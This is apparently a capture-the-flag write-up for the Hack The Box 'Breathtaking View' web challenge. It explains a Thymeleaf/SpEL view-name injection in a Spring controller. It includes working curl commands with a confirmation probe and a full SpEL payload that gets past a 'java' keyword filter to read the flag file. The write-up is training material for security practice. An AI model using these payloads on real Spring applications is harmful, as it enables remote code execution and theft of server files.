# Target
| Category      | Details                                                                          |
|---------------|----------------------------------------------------------------------------------|
| 📝 Name       | [Breathtaking View](https://app.hackthebox.com/challenges/Breathtaking%2520View) |
| 🏷 Type       | HTB Web Challenge                                                                |
| 🎯 Difficulty | Easy                                                                             |

# Solution
Analysis of provided code shows that `com.hackthebox.breathtaking_view.Controllers.IndexController` uses `lang` HTTP parameter to return `thymeleaf` template name to be used as view, which could lead to SpEL injection and hence RCE. This great [article](https://0xn3va.gitbook.io/cheat-sheets/framework/spring/view-manipulation) explains this vulnerability in details. There is however one additional obstacle to overcome, `lang` parameter cannot contain `java` string, which means that we cannot use any code from JDK in injected the SpEL. This is not a big issue as Spring should provide classes to locate and read flag file.

```
@Controller
public class IndexController {
    @GetMapping("/")
    public String index(@RequestParam(defaultValue = "en") String lang, HttpSession session, RedirectAttributes redirectAttributes) {
        if (session.getAttribute("user") == null) {
            return "redirect:/login";
        }

        if (lang.toLowerCase().contains("java")) {  // <-- JDK code filtering.
            redirectAttributes.addFlashAttribute("errorMessage", "But.... For what?");
            return "redirect:/";
        }

        return lang + "/index";                     // <-- SpEL injection / RCE vulnarability.
    }
}
```

Let's start with user registration and authentication.
```
┌──(magicrc㉿perun)-[~/attack/HTB Breathtaking View]
└─$ curl http://$TARGET/register -d 'username=user&password=pass' && \
curl -c cookies.txt http://$TARGET/login -d 'username=user&password=pass'
```

To confirm vulnerability let's use simple `${7*7}` SpEL.
```
┌──(magicrc㉿perun)-[~/attack/HTB Breathtaking View]
└─$ SPEL_PROBE=$(echo '__${7*7}__::.x' | jq -sRr @uri) && \
curl -b cookies.txt http://$TARGET/?lang=$SPEL_PROBE
{"timestamp":"2025-03-08T15:45:26.833+0000","status":500,"error":"Internal Server Error","message":"Error resolving template [49], template might not exist or might not be accessible by any of the configured Template Resolvers","path":"/"}
```

We can see that our SpEL has been executed, as HTTP response contains `Error resolving template [49]`, meaning that target is vulnerable to RCE! Let's prepare our exploit keeping in mind that no JDK code (or `java` string containing code) could be used.

To locate flag file we will use `PathMatchingResourcePatternResolver#getResources`, and to read it we will wrap it in `EncodedResource` so we could pass provided `Reader` instance to `FileCopyUtils#copyToString`. Then we will wrap whole payload in `__${}__::.x`, URL encode it, send in `lang` HTTP parameter and add simple flag grep on top for elegance.

```
┌──(magicrc㉿perun)-[~/attack/HTB Breathtaking View/Breathtaking View]
└─$ SPEL=$(echo '__${
T(org.springframework.util.FileCopyUtils).copyToString(
    new org.springframework.core.io.support.EncodedResource(
        new org.springframework.core.io.support.PathMatchingResourcePatternResolver()
            .getResources("file:/flag*")[0]
    ).getReader())
}__::.x' | jq -sRr @uri)
curl http://$TARGET/register -d 'username=user&password=pass' && \
curl -c cookies.txt http://$TARGET/login -d 'username=user&password=pass' && \
curl -s -b cookies.txt "http://$TARGET/?lang=$SPEL" | grep -oP 'HTB\{.*?\}'
HTB{f4k3_fl4g_f0r_t35t1ng}
```

